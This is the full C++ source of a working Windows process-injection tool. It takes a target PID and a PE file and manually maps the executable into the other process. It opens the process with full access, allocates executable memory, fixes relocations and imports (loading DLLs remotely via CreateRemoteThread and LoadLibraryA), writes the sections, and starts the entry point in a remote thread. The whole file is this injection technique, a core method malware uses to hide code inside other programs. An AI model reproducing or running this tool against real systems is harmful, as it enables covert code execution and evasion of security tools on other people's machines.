#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>


/*
	BUILD:
		g++ ref_pe_injection.cpp -o ref_pe_injection.exe -lntdll
		g++ ref_pe_injection.cpp -o ref_pe_injection.exe -lntdll -m32
*/

#ifdef __GNUC__
#define offsetof(type, member)  __builtin_offsetof (type, member)
#endif

#define GET_DIRECTORY_ENTRY(lpNtHeader, dwEntry) lpNtHeader->OptionalHeader.DataDirectory[dwEntry].VirtualAddress
#define GET_DIRECTORY_SIZE(lpNtHeader, dwEntry) lpNtHeader->OptionalHeader.DataDirectory[dwEntry].Size

#define CONSOLE_COLOR_GREEN		0xA
#define CONSOLE_COLOR_YELLOW	0xE
#define CONSOLE_COLOR_RED		0xC
#define CONSOLE_COLOR_WHITE		0x7

HANDLE hConsole = NULL;
CHAR ErrorMsg[MAX_PATH] = { 0 };


BOOL printf_success(LPCSTR _Format, ...)
{
	if (!hConsole) hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	va_list ArgList = NULL;
	va_start(ArgList, _Format);
	SetConsoleTextAttribute(hConsole, CONSOLE_COLOR_GREEN);
	printf("[+] ");
	vprintf(_Format, ArgList);
	SetConsoleTextAttribute(hConsole, CONSOLE_COLOR_WHITE);
	va_end(ArgList);
	return TRUE;
};

BOOL printf_info(LPCSTR _Format, ...)
{
	if (!hConsole) hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	va_list ArgList = NULL;
	va_start(ArgList, _Format);
	SetConsoleTextAttribute(hConsole, CONSOLE_COLOR_YELLOW);
	printf("[!] ");
	vprintf(_Format, ArgList);
	SetConsoleTextAttribute(hConsole, CONSOLE_COLOR_WHITE);
	va_end(ArgList);
	return TRUE;
};

BOOL printf_error(LPCSTR _Format, ...)
{
	if (!hConsole) hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	va_list ArgList = NULL;
	va_start(ArgList, _Format);
	SetConsoleTextAttribute(hConsole, CONSOLE_COLOR_RED);
	printf("[-] ");
	vprintf(_Format, ArgList);
	SetConsoleTextAttribute(hConsole, CONSOLE_COLOR_WHITE);
	va_end(ArgList);
	return TRUE;
};

LPCSTR GetLastErrorFormat(ULONG dwErrorCode = -1)
{
	if (dwErrorCode == -1) dwErrorCode = GetLastError();
	if (!FormatMessageA(
		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dwErrorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		ErrorMsg,
		sizeof(ErrorMsg),
		NULL))
	{
		printf_error("Error at getting the last error format of code 0x%lx\n", dwErrorCode);
		sprintf(ErrorMsg, "0x%lx", dwErrorCode);
	};
	return ErrorMsg;
};

LPCSTR GetNtStatusFormat(NTSTATUS ntCode)
{
	ULONG dwErrorCode = RtlNtStatusToDosError(ntCode);
	if (dwErrorCode == ERROR_MR_MID_NOT_FOUND)
	{
		printf_error("Error at getting the error code of ntstatus 0x%lx\n", ntCode);
		sprintf(ErrorMsg, "0x%lx", dwErrorCode);
		return ErrorMsg;
	};
	return GetLastErrorFormat(dwErrorCode);
};

BOOL ReportBadPE(LPCSTR lpErrorStr)
{
	printf_error("Invalid or unsupported PE file, %s\n", lpErrorStr);
	return FALSE;
};

DWORD Rva2Offset(PIMAGE_NT_HEADERS lpNtHeader, DWORD dwRva)
{
	PIMAGE_SECTION_HEADER lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
	for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++, lpHeaderSection++) {
		if (dwRva >= lpHeaderSection->VirtualAddress &&
			dwRva < lpHeaderSection->VirtualAddress + lpHeaderSection->Misc.VirtualSize) {
			return lpHeaderSection->PointerToRawData + dwRva - lpHeaderSection->VirtualAddress;
		}
	};
	return 0;
};

DWORD RemoteLoadLibraryA(HANDLE hProcess, LPCSTR lpLibFileName)
{
	SIZE_T stLibNameSize = strlen(lpLibFileName) + 1;

	HANDLE hKernel32 = NULL;
	if (!(hKernel32 = GetModuleHandleA(
		"kernel32.dll"
	)))
	{
		printf_error("Error at GetModuleHandleA, code/msg = %s", GetLastErrorFormat());
		return NULL;
	};

	LPVOID lpLoadLibraryA = NULL;
	if (!(lpLoadLibraryA = (LPVOID)GetProcAddress(
		(HMODULE)hKernel32,
		"LoadLibraryA"
	)))
	{
		printf_error("Error at GetProcAddress, code/msg = %s", GetLastErrorFormat());
		return NULL;
	};

	LPVOID lpAllocatedBase = NULL;
	if (!(lpAllocatedBase = VirtualAllocEx(
		hProcess,
		NULL,
		stLibNameSize,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	)))
	{
		printf_error("Error at VirtualAllocEx, code/msg = %s", GetLastErrorFormat());
		return NULL;
	};

	SIZE_T stWrittenBytes = 0;
	if (!WriteProcessMemory(
		hProcess,
		lpAllocatedBase,
		lpLibFileName,
		stLibNameSize,
		&stWrittenBytes
	) || stWrittenBytes != stLibNameSize)
	{
		printf_error("Error at WriteProcessMemory, code/msg = %s", GetLastErrorFormat());
		return NULL;
	};

	HANDLE hThread = NULL;
	if (!(hThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)lpLoadLibraryA,
		lpAllocatedBase,
		0,
		NULL
	)))
	{
		printf_error("Error at CreateRemoteThread, code/msg = %s", GetLastErrorFormat());
		return NULL;
	};
	
	if (WaitForSingleObject(
		hThread,
		INFINITE
	) != WAIT_OBJECT_0)
	{
		printf_error("Error at WaitForSingleObject, code/msg = %s", GetLastErrorFormat());
		return NULL;
	};
	
	DWORD dwRemoteDll = NULL;
	if (!GetExitCodeThread(
		hThread,
		&dwRemoteDll
	))
	{
		printf_error("Error at GetExitCodeThread, code/msg = %s", GetLastErrorFormat());
		return NULL;
	};

	if (!VirtualFreeEx(
		hProcess,
		lpAllocatedBase,
		0,
		MEM_RELEASE
	))
	{
		printf_error("Error at VirtualFreeEx, code/msg = %s", GetLastErrorFormat());
		return NULL;
	};

	return dwRemoteDll;
};

INT main(INT argc, CHAR** argv) {

	if (argc > 2)
	{
		DWORD dwPid = atoi(argv[1]);
		LPCSTR szPeFile = argv[2];

		HANDLE hFile;
		if (!(hFile = CreateFileA(
			szPeFile,
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		)) || INVALID_HANDLE_VALUE == hFile)
		{
			printf_error("Error at CreateFileA, code/msg = %s", GetLastErrorFormat());
			return FALSE;
		};
#if defined(_M_X64) || defined(__amd64__)
		printf_success("The PE opened with handle 0x%llx\n", (ULONGLONG)hFile);
#else
		printf_success("The PE opened with handle 0x%lx\n", (ULONG)hFile);
#endif

		LARGE_INTEGER u32FileSize;
		if (!GetFileSizeEx(
			hFile,
			&u32FileSize
		))
		{
			printf_error("Error at GetFileSizeEx, code/msg = %s", GetLastErrorFormat());
			return 0;
		};

		LPVOID bFileContent;
		if (!(bFileContent = VirtualAlloc(
			NULL,
			u32FileSize.QuadPart,
			(MEM_COMMIT | MEM_RESERVE),
			PAGE_READWRITE
		)))
		{
			printf_error("Error at VirtualAlloc, code/msg = %s", GetLastErrorFormat());
			return 0;
		};

		DWORD dwReadBytes;
		if (!ReadFile(
			hFile,
			bFileContent,
			u32FileSize.QuadPart,
			&dwReadBytes,
			NULL
		) || dwReadBytes != u32FileSize.QuadPart)
		{
			printf_error("Error at ReadFile, code/msg = %s", GetLastErrorFormat());
			return 0;
		};
#if defined(_M_X64) || defined(__amd64__)
		printf_success("Read %d bytes from the supplied PE file, stored at 0x%llx\n", u32FileSize.QuadPart, (ULONGLONG)bFileContent);
#else
		printf_success("Read %d bytes from the supplied PE file, stored at 0x%lx\n", u32FileSize.QuadPart, (ULONG)bFileContent);
#endif

		CloseHandle(hFile);

		if (u32FileSize.QuadPart < sizeof(IMAGE_DOS_HEADER)) return ReportBadPE("it has very small IMAGE_DOS_HEADER");
		PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)bFileContent;
		if (lpDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return ReportBadPE("invalid DOS signature");

		if (u32FileSize.QuadPart < lpDosHeader->e_lfanew + (LONGLONG)sizeof(IMAGE_NT_HEADERS)) return ReportBadPE("it has very small IMAGE_NT_HEADERS");
		PIMAGE_NT_HEADERS lpNtHeader = (PIMAGE_NT_HEADERS)((LONG_PTR)bFileContent + lpDosHeader->e_lfanew);
		if (lpNtHeader->Signature != IMAGE_NT_SIGNATURE) return ReportBadPE("invalid NT signature");

		if (lpNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
		{
#if defined(_M_X64) || defined(__amd64__)
			if (lpNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) return ReportBadPE("invalid or unsupported magic");
			printf_error("Use the x32 binary to handle this x32 PE\n");
#else
			if (lpNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return ReportBadPE("invalid or unsupported magic");
			printf_error("Use the x64 binary to handle this x64 PE\n");
#endif
			return FALSE;
		};
#if defined(_M_X64) || defined(__amd64__)
		printf_info("The PE is x64 executable\n");
#else
		printf_info("The PE is x32 executable\n");
#endif

		if (u32FileSize.QuadPart < lpNtHeader->OptionalHeader.SizeOfHeaders) return ReportBadPE("the headers size is very small");

		HANDLE hProcess = NULL;
		if (!(hProcess = OpenProcess(
			PROCESS_ALL_ACCESS,
			FALSE,
			dwPid
		)))
		{
			printf_error("Error at OpenProcess, code/msg = %s", GetLastErrorFormat());
			return FALSE;
		};
#if defined(_M_X64) || defined(__amd64__)
		printf_success("Target process opened with handle 0x%llx\n", (ULONGLONG)hProcess);
#else
		printf_success("Target process opened with handle 0x%lx\n", (ULONG)hProcess);
#endif

		ULONG ulWrittenSize = 0;
		LPVOID lpIsWow64 = NULL;
		NTSTATUS ntProcessStatus = STATUS_SUCCESS;
		if ((ntProcessStatus = NtQueryInformationProcess(
			hProcess,
			ProcessWow64Information,
			&lpIsWow64,
			sizeof(lpIsWow64),
			&ulWrittenSize
		)) || ulWrittenSize != sizeof(lpIsWow64))
		{
			printf_error("Error at NtQueryInformationProcess, status code/msg = %s\n", GetNtStatusFormat(ntProcessStatus));
			return FALSE;
		};

#if defined(_M_X64) || defined(__amd64__)
		if (lpIsWow64)
		{
			printf_info("Target process is x32 process running on x64 system\n");
			printf_error("Use the x32 binary to handle this x32 process\n");
			return FALSE;
		};
		printf_info("Target process is x64 process running on x64 system\n");
#else
		HMODULE hKernel32 = NULL;
		if (!(hKernel32 = GetModuleHandleA("kernel32")))
		{
			printf_error("Error at GetModuleHandle, code/msg = %s", GetLastErrorFormat());
			return FALSE;
		};

		LPVOID fnGetSystemWow64DirectoryA = NULL;
		if ((fnGetSystemWow64DirectoryA = (LPVOID)GetProcAddress(hKernel32, "GetSystemWow64DirectoryA")))
		{
			CHAR WoW64Dir[1] = { 0 };
			if ((*(UINT(*)(LPSTR, UINT)) fnGetSystemWow64DirectoryA)(
				WoW64Dir,
				sizeof(WoW64Dir)
				))
			{
				if (!lpIsWow64)
				{
					printf_info("Target process is x64 process running on x64 system\n");
					printf_error("Use the x64 binary to handle this x64 process\n");
					return FALSE;
				};
				printf_info("Target process is x32 process running on x64 system\n");
			}
			else if (GetLastError() == ERROR_CALL_NOT_IMPLEMENTED)
			{
				printf_info("Target process is x32 process running on x32 system\n");
			}
			else
			{
				printf_error("Error at GetSystemWow64DirectoryA, code/msg = %s", GetLastErrorFormat());
				return FALSE;
			};
		}
		else if (GetLastError() == ERROR_PROC_NOT_FOUND)
		{
			printf_info("Target process is x32 process running on x32 system\n");
		}
		else
		{
			printf_error("Error at GetProcAddress, code/msg = %s", GetLastErrorFormat());
			return FALSE;
		};
#endif
		
		LPVOID lpPreferableBase = (LPVOID)lpNtHeader->OptionalHeader.ImageBase;
		LPVOID lpAllocatedBase = NULL;
		if (!(lpAllocatedBase = VirtualAllocEx(
			hProcess,
			lpPreferableBase,
			lpNtHeader->OptionalHeader.SizeOfImage,
			(MEM_COMMIT | MEM_RESERVE),
			PAGE_EXECUTE_READWRITE
		)) ||
#if defined(_M_X64) || defined(__amd64__)
			!printf_success("Allocated memory for the PE at the remote process at address = 0x%llx, no relocation is needed\n", (ULONGLONG)lpAllocatedBase)
#else
			!printf_success("Allocated memory for the PE at the remote process at address = 0x%lx, no relocation is needed\n", (ULONG)lpAllocatedBase)
#endif
			)
		{
			if (GetLastError() == ERROR_INVALID_ADDRESS)
			{
				lpAllocatedBase = NULL;
				if (!(lpAllocatedBase = VirtualAllocEx(
					hProcess,
					NULL,
					lpNtHeader->OptionalHeader.SizeOfImage,
					(MEM_COMMIT | MEM_RESERVE),
					PAGE_EXECUTE_READWRITE
				)))
				{
					printf_error("Error at VirtualAllocEx, code/msg = %s", GetLastErrorFormat());
					return FALSE;
				};
#if defined(_M_X64) || defined(__amd64__)
				printf_success("Allocated memory for the PE at the remote process at address = 0x%llx, relocation is needed\n", (ULONGLONG)lpAllocatedBase);
#else
				printf_success("Allocated memory for the PE at the remote process at address = 0x%lx, relocation is needed\n", (ULONG)lpAllocatedBase);
#endif
			}
			else
			{
				printf_error("Error at VirtualAllocEx, code/msg = %s", GetLastErrorFormat());
				return FALSE;
			};
		};

		if (lpPreferableBase != lpAllocatedBase)
		{
			if (lpNtHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
			{
				printf_error("Cannot relocate the PE because the relocation table is stripped\n");
				return FALSE;
			};

#if defined(_M_X64) || defined(__amd64__)
			lpNtHeader->OptionalHeader.ImageBase = (ULONGLONG)lpAllocatedBase;
			printf_success("PE base relocated to 0x%llx\n", lpNtHeader->OptionalHeader.ImageBase);
#else
			lpNtHeader->OptionalHeader.ImageBase = (ULONG)lpAllocatedBase;
			printf_success("PE base relocated to 0x%lx\n", lpNtHeader->OptionalHeader.ImageBase);
#endif

			DWORD dwRelocBaseOffset = Rva2Offset(lpNtHeader, GET_DIRECTORY_ENTRY(lpNtHeader, IMAGE_DIRECTORY_ENTRY_BASERELOC));
			DWORD dwRelocSize = GET_DIRECTORY_SIZE(lpNtHeader, IMAGE_DIRECTORY_ENTRY_BASERELOC);
			if (u32FileSize.QuadPart < (LONGLONG)dwRelocBaseOffset + (LONGLONG)dwRelocSize) return ReportBadPE("relocation table is out of boundaries");

			LPVOID lpRelocBase = (LPVOID)((DWORD_PTR)bFileContent + dwRelocBaseOffset);

			for (DWORD dwMemIndex = 0; dwMemIndex < dwRelocSize;)
			{
				PIMAGE_BASE_RELOCATION lpBaseRelocBlock = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lpRelocBase + dwMemIndex);
				LPVOID lpBlocksEntry = (LPVOID)((DWORD_PTR)lpBaseRelocBlock + sizeof(lpBaseRelocBlock->SizeOfBlock) + sizeof(lpBaseRelocBlock->VirtualAddress));

				DWORD dwNumberOfBlocks = (lpBaseRelocBlock->SizeOfBlock - sizeof(lpBaseRelocBlock->SizeOfBlock) - sizeof(lpBaseRelocBlock->VirtualAddress)) / sizeof(WORD);
				PWORD lpBlocks = (PWORD)lpBlocksEntry;

				for (DWORD dwBlockIndex = 0; dwBlockIndex < dwNumberOfBlocks; dwBlockIndex++)
				{
					WORD wBlockType = (lpBlocks[dwBlockIndex] & 0xf000) >> 0xC;
					WORD wBlockOffset = lpBlocks[dwBlockIndex] & 0x0fff;

					if ((wBlockType == IMAGE_REL_BASED_HIGHLOW) || (wBlockType == IMAGE_REL_BASED_DIR64))
					{
						DWORD dwAdrressOffset = Rva2Offset(lpNtHeader, lpBaseRelocBlock->VirtualAddress + (DWORD)wBlockOffset);
						if (u32FileSize.QuadPart < (LONGLONG)dwAdrressOffset + (LONGLONG)sizeof(PVOID)) return ReportBadPE("relocation block is out of boundaries");
#if defined(_M_X64) || defined(__amd64__)
						PULONGLONG lpAddress = (PULONGLONG)((DWORD_PTR)bFileContent + dwAdrressOffset);
						ULONGLONG ullOldAddress = *lpAddress;
						*lpAddress -= (ULONGLONG)lpPreferableBase;
						*lpAddress += (ULONGLONG)lpAllocatedBase;
						printf_success("Address relocated from 0x%llx to 0x%llx\n", ullOldAddress, *lpAddress);
#else
						PULONG lpAddress = (PULONG)((DWORD_PTR)bFileContent + dwAdrressOffset);
						ULONG ullOldAddress = *lpAddress;
						*lpAddress -= (ULONG)lpPreferableBase;
						*lpAddress += (ULONG)lpAllocatedBase;
						printf_success("Address relocated from 0x%lx to 0x%lx\n", ullOldAddress, *lpAddress);
#endif
					}
					else if (lpBlocks[dwBlockIndex] != 0)
					{
						return ReportBadPE("unsupported pe relocation");
					};
				};
				dwMemIndex += lpBaseRelocBlock->SizeOfBlock;
			};
		};

		DWORD dwImportsOffset = Rva2Offset(lpNtHeader, GET_DIRECTORY_ENTRY(lpNtHeader, IMAGE_DIRECTORY_ENTRY_IMPORT));
		DWORD dwImportsSize = GET_DIRECTORY_SIZE(lpNtHeader, IMAGE_DIRECTORY_ENTRY_IMPORT);
		if (u32FileSize.QuadPart < (LONGLONG)dwImportsOffset + (LONGLONG)dwImportsSize) return ReportBadPE("import table is out of boundaries");

		PIMAGE_IMPORT_DESCRIPTOR lpImportData = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)bFileContent + dwImportsOffset);

		while (lpImportData->Name != NULL)
		{
			if (u32FileSize.QuadPart < (LONGLONG)Rva2Offset(lpNtHeader, lpImportData->Name) + MAX_PATH) return ReportBadPE("invalid dll name address");
			PCHAR szDllName = (PCHAR)((DWORD_PTR)bFileContent + Rva2Offset(lpNtHeader, lpImportData->Name));
			printf_info("Handling library %s\n", szDllName);

			HMODULE hLocalLibrary = NULL;
			HMODULE hRemoteLibrary = NULL;
			DWORD dwRemoteLibrary = NULL;
			if (!(hLocalLibrary = LoadLibraryA(szDllName)))
			{
				printf_error("Cannot load this specific dll locally\n");
				return FALSE;
			};
			if (!(dwRemoteLibrary = RemoteLoadLibraryA(hProcess, szDllName)))
			{
				printf_error("Cannot load this specific dll remotely\n");
				return FALSE;
			};

#if defined(_M_X64) || defined(__amd64__)
			hRemoteLibrary = (HMODULE)(((ULONGLONG)hLocalLibrary & 0xffffffff00000000) + dwRemoteLibrary);
#else
			hRemoteLibrary = (HMODULE)dwRemoteLibrary;
#endif

			DWORD dwFirstThunk = 0;
			lpImportData->TimeDateStamp ? dwFirstThunk = lpImportData->OriginalFirstThunk : dwFirstThunk = lpImportData->FirstThunk;
			if (!dwFirstThunk) return ReportBadPE("invalid thunk array");

			if (u32FileSize.QuadPart < (LONGLONG)Rva2Offset(lpNtHeader, dwFirstThunk) + (LONGLONG)sizeof(IMAGE_THUNK_DATA))
				return ReportBadPE("import table is out of boundaries");
			if (u32FileSize.QuadPart < (LONGLONG)Rva2Offset(lpNtHeader, lpImportData->FirstThunk) + (LONGLONG)sizeof(IMAGE_THUNK_DATA))
				return ReportBadPE("import table is out of boundaries");

			PIMAGE_THUNK_DATA dwCThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)bFileContent + Rva2Offset(lpNtHeader, dwFirstThunk));
			PIMAGE_THUNK_DATA dwFThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)bFileContent + Rva2Offset(lpNtHeader, lpImportData->FirstThunk));

			while (dwCThunk->u1.AddressOfData)
			{
				CHAR szApiInfo[MAX_PATH] = { 0 };
				LPVOID lpApiLocalAddress = NULL;
				if (IMAGE_SNAP_BY_ORDINAL(dwCThunk->u1.Ordinal)) {

					WORD wOrdinal = IMAGE_ORDINAL(dwCThunk->u1.Ordinal);
					if (!(lpApiLocalAddress = (LPVOID)GetProcAddress(
						hLocalLibrary,
						MAKEINTRESOURCE(wOrdinal)
					)))
					{
						printf_error("Error at GetProcAddress, code/msg = %s", GetLastErrorFormat());
						return FALSE;
					};
					sprintf(szApiInfo, "Ordinal %d", wOrdinal);
				}
				else
				{
					if (u32FileSize.QuadPart < (LONGLONG)Rva2Offset(lpNtHeader, dwCThunk->u1.AddressOfData) + (LONGLONG)sizeof(IMAGE_IMPORT_BY_NAME))
						return ReportBadPE("api IMAGE_IMPORT_BY_NAME address is out of boundaries");
					PIMAGE_IMPORT_BY_NAME lpApiImport = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)bFileContent + Rva2Offset(lpNtHeader, dwCThunk->u1.AddressOfData));
					if (!(lpApiLocalAddress = (LPVOID)GetProcAddress(
						hLocalLibrary,
						(LPCSTR)lpApiImport->Name
					)))
					{
						printf_error("Error at GetProcAddress, code/msg = %s", GetLastErrorFormat());
						return FALSE;
					};
					sprintf(szApiInfo, "%s", lpApiImport->Name);
				};

#if defined(_M_X64) || defined(__amd64__)
				LPVOID lpRemoteApiAddress = (LPVOID)((ULONGLONG)lpApiLocalAddress - (ULONGLONG)hLocalLibrary + (ULONGLONG)hRemoteLibrary);
				printf_success("Got the remote address of the api = 0x%llx (%s)\n", lpRemoteApiAddress, szApiInfo);
				dwFThunk->u1.AddressOfData = (ULONGLONG)lpRemoteApiAddress;
#else
				LPVOID lpRemoteApiAddress = (LPVOID)((ULONG)lpApiLocalAddress - (ULONG)hLocalLibrary + (ULONG)hRemoteLibrary);
				printf_success("Got the remote address of the api = 0x%lx (%s)\n", lpRemoteApiAddress, szApiInfo);
				dwFThunk->u1.AddressOfData = (ULONG)lpRemoteApiAddress;
#endif
				dwFThunk++;
				dwCThunk++;
			};

			FreeLibrary(hLocalLibrary);
			lpImportData++;
		};

		printf_info("Writing the PE image the new base\n");
		SIZE_T stWrittenBytes = 0;
		if (!WriteProcessMemory(
			hProcess,
			lpAllocatedBase,
			bFileContent,
			lpNtHeader->OptionalHeader.SizeOfHeaders,
			&stWrittenBytes
		) || stWrittenBytes != lpNtHeader->OptionalHeader.SizeOfHeaders)
		{
			printf_error("Error at WriteProcessMemory, code/msg = %s", GetLastErrorFormat());
			return FALSE;
		};

		LPCSTR szProtection = NULL;
		DWORD dwOldProtect = 0;
		if (!VirtualProtectEx(
			hProcess,
			lpAllocatedBase,
			lpNtHeader->OptionalHeader.SizeOfHeaders,
			PAGE_READONLY,
			&dwOldProtect
		))
		{
			printf_error("Error at VirtualProtectEx, code/msg = %s", GetLastErrorFormat());
			return FALSE;
		};

		szProtection = "PAGE_READONLY";
#if defined(_M_X64) || defined(__amd64__)
		printf_success("Headers written at 0x%llx, with protection %s\n", (ULONGLONG)lpAllocatedBase, szProtection);
#else
		printf_success("Headers written at 0x%lx, with protection %s\n", (ULONG)lpAllocatedBase, szProtection);
#endif
		PIMAGE_SECTION_HEADER lpSectionHeaderArray = (PIMAGE_SECTION_HEADER)((ULONG_PTR)bFileContent + lpDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
		for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++, lpSectionHeaderArray++)
		{
			if (!WriteProcessMemory(
				hProcess,
#if defined(_M_X64) || defined(__amd64__)
				(LPVOID)((ULONGLONG)lpAllocatedBase + lpSectionHeaderArray->VirtualAddress),
#else
				(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray->VirtualAddress),
#endif
				(LPCVOID)((DWORD_PTR)bFileContent + lpSectionHeaderArray->PointerToRawData),
				lpSectionHeaderArray->SizeOfRawData,
				&stWrittenBytes
			) || stWrittenBytes != lpSectionHeaderArray->SizeOfRawData)
			{
				printf_error("Error at WriteProcessMemory, code/msg = %s", GetLastErrorFormat());
				return FALSE;
			};

			DWORD dwSectionMappedSize = 0;
			if (dwSecIndex == lpNtHeader->FileHeader.NumberOfSections - 1) {
				dwSectionMappedSize = lpNtHeader->OptionalHeader.SizeOfImage - lpSectionHeaderArray->VirtualAddress;
			}
			else {
				dwSectionMappedSize = lpSectionHeaderArray[1].VirtualAddress - lpSectionHeaderArray->VirtualAddress;
			}

			DWORD dwSectionProtection = 0;
			if ((lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
				(lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_READ) &&
				(lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_WRITE)) {
				dwSectionProtection = PAGE_EXECUTE_READWRITE;
				szProtection = "PAGE_EXECUTE_READWRITE";
			}
			else if ((lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
				(lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_READ)) {
				dwSectionProtection = PAGE_EXECUTE_READ;
				szProtection = "PAGE_EXECUTE_READ";
			}
			else if ((lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
				(lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_WRITE)) {
				dwSectionProtection = PAGE_EXECUTE_WRITECOPY;
				szProtection = "PAGE_EXECUTE_WRITECOPY";
			}
			else if ((lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_READ) &&
				(lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_WRITE)) {
				dwSectionProtection = PAGE_READWRITE;
				szProtection = "PAGE_READWRITE";
			}
			else if (lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
				dwSectionProtection = PAGE_EXECUTE;
				szProtection = "PAGE_EXECUTE";
			}
			else if (lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_READ) {
				dwSectionProtection = PAGE_READONLY;
				szProtection = "PAGE_READONLY";
			}
			else if (lpSectionHeaderArray->Characteristics & IMAGE_SCN_MEM_WRITE) {
				dwSectionProtection = PAGE_WRITECOPY;
				szProtection = "PAGE_WRITECOPY";
			}
			else {
				dwSectionProtection = PAGE_NOACCESS;
				szProtection = "PAGE_NOACCESS";
			};

			if (!VirtualProtectEx(
				hProcess,
#if defined(_M_X64) || defined(__amd64__)
				(LPVOID)((ULONGLONG)lpAllocatedBase + lpSectionHeaderArray->VirtualAddress),
#else
				(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray->VirtualAddress),
#endif
				dwSectionMappedSize,
				dwSectionProtection,
				&dwOldProtect
			))
			{
				printf_error("Error at VirtualProtectEx, code/msg = %s", GetLastErrorFormat());
				return FALSE;
			};

#if defined(_M_X64) || defined(__amd64__)
			printf_success("Section %s written at 0x%llx, with protection %s\n", lpSectionHeaderArray->Name, (ULONGLONG)lpAllocatedBase + lpSectionHeaderArray->VirtualAddress, szProtection);
#else
			printf_success("Section %s written at 0x%lx, with protection %s\n", lpSectionHeaderArray->Name, (ULONG)lpAllocatedBase + lpSectionHeaderArray->VirtualAddress, szProtection);
#endif
		};

		HANDLE hThread = NULL;
		if (!(hThread = CreateRemoteThread(
			hProcess,
			NULL,
			0,
#if defined(_M_X64) || defined(__amd64__)
			(LPTHREAD_START_ROUTINE)((ULONGLONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint),
#else
			(LPTHREAD_START_ROUTINE)((ULONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint),
#endif
			NULL,
			0,
			NULL
		)))
		{
			printf_error("Error at CreateRemoteThread, code/msg = %s", GetLastErrorFormat());
			return NULL;
		};

#if defined(_M_X64) || defined(__amd64__)
		printf_success("A new thread created at the entry point 0x%llx\n", (ULONGLONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint);
#else
		printf_success("A new thread created at the entry point 0x%llx\n", (ULONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint);
#endif
	}
	else
	{
		printf("%s [target_process_pid] [pe_file]\n", argv[0]);
		return TRUE;
	};
};